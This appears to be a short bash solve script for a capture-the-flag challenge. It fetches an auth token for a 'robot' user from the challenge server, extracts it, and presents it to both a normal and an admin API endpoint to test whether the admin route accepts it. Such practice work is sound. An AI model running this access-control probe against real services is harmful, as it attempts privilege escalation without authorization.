A=$(curl "http://ctfchallenges.ritsec.club:3000/auth?name=robot")

B=${A:10:300}
B=$(echo $B| cut -d '"' -f 1)

echo $B

curl http://ctfchallenges.ritsec.club:4000/api/normal -H "Authorization: $B"

curl http://ctfchallenges.ritsec.club:4000/api/admin -H "Authorization: $B"
